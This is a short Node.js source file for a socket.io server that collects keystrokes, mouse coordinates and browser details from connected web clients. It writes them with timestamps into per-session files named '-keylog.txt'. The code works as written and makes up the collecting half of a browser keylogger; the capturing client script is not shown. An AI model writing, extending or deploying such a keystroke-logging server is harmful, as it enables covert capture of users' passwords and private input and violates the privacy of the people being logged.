const fs = require('fs'); // filestream
const server = require('http').createServer(); // native node server
const io = require('socket.io')(server); //socket
const ms = require('ms'); // timestamps

const dir = "logs/";

const Timestamp = function(started){
    let current = Date.now();
    return ms(current - started);
}

io.on('connection', (socket) => {

  let startedAt = Date.now();
  let date = new Date();
  date = `${date.getFullYear()}_${date.getHours()}_${date.getMinutes()}`;

  // start writing to a file when a new session starts
  console.log(`session started on ${new Date()}`);
  let keystream = fs.createWriteStream(dir + date + '-keylog.txt', {
    flags: 'a'
  });

  keystream.write(`--- session started --- \r\n`);

  socket.on('info', (info) => {
    keystream.write(`Browser is ${info} \r\n`);
  });

  // on keypress, write the contents to a file
  socket.on('keypress', (contents) => {
    keystream.write(`${Timestamp(startedAt)}~ ${contents} \r\n`);
  });

  // on mousemove, write the contents to a file
  socket.on('mousemove', (contents) => {
    let input = JSON.parse(contents);
    keystream.write(`[click] at ${Timestamp(startedAt)}~ X:${input.x} Y: ${input.y} \r\n`);
  });

  // once the user has disconnected, save the file and end the stream
  socket.on('disconnect', () => {
    console.log(`session ended after ${Timestamp(startedAt)}`);
    keystream.write(` --- session disconnected after ${Timestamp(startedAt)} --- \r\n`);
    keystream.end(); // save the file;
  });
});

server.listen(1338);
console.log(`server started on ${new Date()}`);
